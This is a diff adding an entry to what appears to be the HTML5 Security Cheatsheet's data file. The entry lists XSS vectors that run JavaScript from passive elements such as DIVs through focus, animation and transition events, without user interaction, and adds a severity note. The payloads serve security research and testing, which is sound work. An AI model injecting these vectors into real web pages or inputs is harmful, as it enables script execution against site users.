@@ -5151,6 +5151,45 @@ return [
         },
         'tags'      : ['entity', 'character reference', 'html5', 'iframe'],
         'reporter'  : '.mario'
-    }    
+    },
+    { /* ID 145 - XSS without User Interaction from passive Elements */
+        'id'        : 145,
+        'category'  : 'html5',
+        'name'      : {
+            'en'    : 'XSS without User Interaction from passive Elements',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'data'      : '#Chrome, Opera, Safari and Edge\r\n<div onfocus="alert(1)" contenteditable tabindex="0" id="xss">123</div>\r\n\r\n# Firefox\r\n<div onbeforescriptexecute="alert(2)">456</div>\r\n<script>1</script>\r\n\r\n# MSIE11\r\n<div onactivate=alert(3) id=xss style="overflow:scroll"></div>\r\n\r\n# Chrome, Opera, Safari\r\n<style>@keyframes x{}</style>\r\n<div style=animation-name:x onanimationstart=alert(4)></div>\r\n\r\n# Chrome, Opera, Safari\r\n<style>\r\ndiv {width: 100px;}\r\ndiv:target {width: 200px;}\r\n</style>\r\n<div id="xss" onwebkittransitionend="alert(5)" style="-webkit-transition: width .1s;">blaaa!</div>',
+        'description' : {
+            'en'    : 'Often, an attacker can only inject into a "passive" element, meaning for instance a DIV or a SPAN. For those elements, it\'s not always trivial to execute injected JavaScript without user interaction (such as clicks or mouse events). If the element injected into is outside the visible range, it becomes hard to prove that the injection is in fact exploitable. For this reason, this item lists all currently known ways of executing JavaScript without user interaction from passive elements. The list is expected to grow over time.',
+            'ja'    : '',
+            'ru'    : '', 
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'urls'      : [],
+        'howtofix'  : {
+            'en'    : 'Most modern browsers provide ways to execute JavaScript from passive elements by combining several aspects an attacker can control. Seemingly passive XSS should thus be treated with similar severity than active XSS.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'browsers'  : {
+            'chrome' : ['4.0', 'latest'], 
+            'opera' : ['12.0', 'latest'],
+            'internet explorer' : ['9.0', 'latest'],
+            'firefox' : ['4.x', 'latest'],
+            'safari' : ['4.0', 'latest']
+        },
+        'tags'      : ['user interaction', 'passive elements', 'html5', 'css', 'contenteditable'],
+        'reporter'  : '.mario, Ben Hayak, avlidienbrunn'
+    }
 ]
 }));
